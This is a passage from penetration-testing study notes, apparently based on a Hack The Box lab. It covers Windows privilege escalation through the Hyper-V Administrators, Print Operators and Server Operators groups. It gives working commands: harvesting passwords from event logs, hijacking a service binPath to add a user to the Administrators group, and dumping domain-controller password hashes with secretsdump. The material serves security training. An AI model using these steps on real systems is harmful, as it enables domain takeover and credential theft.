> PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
> ```
>
> ```powershell
> CommandLine
> -----------
> net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Hypr-V Administrators {{{-->
### Hypr-V Administrators

[Hypr-V Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#hyper-v-administrators)
have complete and unrestricted access to all the features in
[Hyper-V](https://en.wikipedia.org/wiki/Hyper-V)

<!-- Warning {{{-->
> [!warning]
>
> This vector has been mitigeated by the March 2020
> Windows security update
<!-- }}} -->

<!-- Warning - Domain Controllers {{{-->
> [!warning]- Domain Controllers
>
> If a [[Domain Controller]] is virtualized, `Hyper-V Administrators`
> should be considered [[#Domain Admins]]
>
> A [[Domain Controller]]s can be cloned and mounted as a virtual disk
> to obtain the `NTDS.dit` file 
<!-- }}} -->

```powershell
Get-NetGroupMember -Identity "Hypr-V Administrators" -Recurse
```

1. Update the [POC](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)
   to grant full permissions

```powershell
.\hyperv-eop.ps1
```

1. Take ownership of a file
   (*e.g. Mozilla Maintenance Service*)

```sh
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
> ```
<!-- }}} -->

2. Start Mozilla Maintenance Service

```sh
sc.exe start MozillaMaintenance
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> sc.exe start MozillaMaintenance
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Print Operators {{{-->
### Print Operators

[Print Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators)
can log in to a [[Domain Controller]] and manage,
create, share, and delete printers connected to it

```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

1. Confirm privileges

If `SeLoadDriverPrivileges` is not present,
[[UAC]] needs to be bypassed

```sh
whoami /priv
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> whoami /priv
> ```
>
> ```sh
> PRIVILEGES INFORMATION
> ----------------------
>
> Privilege Name           Description                          State
> ======================== =================================    =======
> SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
> SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
> SeShutdownPrivilege      Shut down the system                 Disabled
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Server Operators {{{-->
### Server Operators

[Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)
can administer a [[Domain Controller]]

**Server Operators** grants [[Privileges#SeBackupPrivilege|SeBackupPrivilege]]
and [[Privileges#SeRestorePrivilege|SeRestorePrivilege]]

<!-- Actions {{{-->
> [!tip]- Actions
>
> Members can take the following actions
>
> - Sign in to a server interactively
> - Create and delete network shared resources
> - Stop and start services
> - Back up and restore files
> - Format the hard disk drive of the device
> - Shut down the device
<!-- }}} -->

```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

1. Query the `Appreadiness` service

```sh
sc qc Appreadiness
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> sc qc AppReadiness
> ```
> ```sh
> [SC] QueryServiceConfig SUCCESS
>
> SERVICE_NAME: AppReadiness
>         TYPE               : 20  WIN32_SHARE_PROCESS
>         START_TYPE         : 3   DEMAND_START
>         ERROR_CONTROL      : 1   NORMAL
>         BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
>         LOAD_ORDER_GROUP   :
>         TAG                : 0
>         DISPLAY_NAME       : App Readiness
>         DEPENDENCIES       :
>         SERVICE_START_NAME : LocalSystem
> ```
<!-- }}} -->

2. [PsService](https://learn.microsoft.com/en-us/sysinternals/downloads/psservice) —
Check permissions on the service

[[#Server Operators]] should have [SERVICE_ALL_ACCESS](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
rights

```sh
C:\PsService.exe security AppReadiness
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> c:\Tools\PsService.exe security AppReadiness
> ```
> ```sh
> PsService v2.25 - Service information and configuration utility
> Copyright (C) 2001-2010 Mark Russinovich
> Sysinternals - www.sysinternals.com
>
> SERVICE_NAME: AppReadiness
> DISPLAY_NAME: App Readiness
>         ACCOUNT: LocalSystem
>         SECURITY:
>         [ALLOW] NT AUTHORITY\SYSTEM
>                 Query status
>                 Query Config
>                 Interrogate
>                 Enumerate Dependents
>                 Pause/Resume
>                 Start
>                 Stop
>                 User-Defined Control
>                 Read Permissions
>         [ALLOW] BUILTIN\Administrators
>                 All
>         [ALLOW] NT AUTHORITY\INTERACTIVE
>                 Query status
>                 Query Config
>                 Interrogate
>                 Enumerate Dependents
>                 User-Defined Control
>                 Read Permissions
>         [ALLOW] NT AUTHORITY\SERVICE
>                 Query status
>                 Query Config
>                 Interrogate
>                 Enumerate Dependents
>                 User-Defined Control
>                 Read Permissions
>         [ALLOW] BUILTIN\Server Operators
>                 All
> ```
<!-- }}} -->

3. Check Local Admin group membership

Confirm that target account is not present

```sh
net localgroup Administrators
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> net localgroup Administrators
> ```
>
> ```sh
> Alias name     Administrators
> Comment        Administrators have complete and unrestricted access to the computer/domain
>
> Members
>
> -------------------------------------------------------------------------------
> Administrator
> Domain Admins
> Enterprise Admins
> The command completed successfully.
> ```
<!-- }}} -->

4. Modify the service binary path

Change the binary path to execute a command which adds
the current user to the default local administrators group

```sh
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
> ```
>
> ```sh
> [SC] ChangeServiceConfig SUCCESS
> ```
<!-- }}} -->

5. Start the service

```sh
sc start AppReadiness
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> sc start AppReadiness
> ```
>
> ```sh
> [SC] StartService FAILED 1053:
>
> The service did not respond to the start or control request in a timely fashion.
> ```
<!-- }}} -->

6. Confirm Local Admin group membership

```sh
net localgroup Administrators
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> net localgroup Administrators
> ```
> ```sh
> Alias name     Administrators
> Comment        Administrators have complete and unrestricted access to the computer/domain
>
> Members
>
> -------------------------------------------------------------------------------
> Administrator
> Domain Admins
> Enterprise Admins
> server_adm
> The command completed successfully.
> ```
<!-- }}} -->

7. Confirm Local Admin access on [[Domain Controller]]

Full control over the [[Domain Controller]] allows to
- Retrieve credentials from the NTDS database
- Access other systems
- Perform post-exploitation tasks

```sh
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> MarciPwns@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
> ```
>
> ```sh
> SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
> SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
> ```
<!-- }}} -->

8. Retrieve NTLM password hashes from the [[Domain Controller]]

```sh
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
> ```
>
> ```sh
> Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
>
> Password:
> [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
> [*] Using the DRSUAPI method to get NTDS.DIT secrets
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
> [*] Kerberos keys grabbed
> Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
> Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
> Administrator:des-cbc-md5:d60dfbbf20548938
> [*] Cleaning up...
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
